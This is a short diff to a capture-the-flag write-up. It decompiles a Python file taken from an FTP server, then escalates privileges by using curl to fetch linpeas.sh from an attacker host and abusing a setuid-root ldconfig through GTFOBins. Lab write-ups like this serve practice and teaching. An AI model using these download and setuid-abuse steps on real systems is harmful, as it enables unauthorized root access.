@@ -80,7 +80,6 @@ Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
 ### Get the file in the ftp server 
 
 ### It's python compyle so i uncompyle it with online tool
-uncompyle undead
 
 #### File Content
 ```python
@@ -146,11 +145,11 @@ https://sha-mbles.github.io/
 
 ## Privilege Escalation
 
-curl -O http://10.8.37.214:80/linpeas.sh
+curl -O http://<IP>:80/linpeas.sh
 
 ### linpeas gives me the vulnerability
 ```bash
 -rwsr-xr-x 1 root root 978K Apr 21  2021 /sbin/ldconfig
 ```
-### I use the GTFOBins Website to exploit the vulnerability, i just follow the instruction and i got a shell as root
+### I use the GTFOBins Website to exploit the vulnerability, I just follow the instructions and i got a shell as root
 gtfobins -> ldconfig
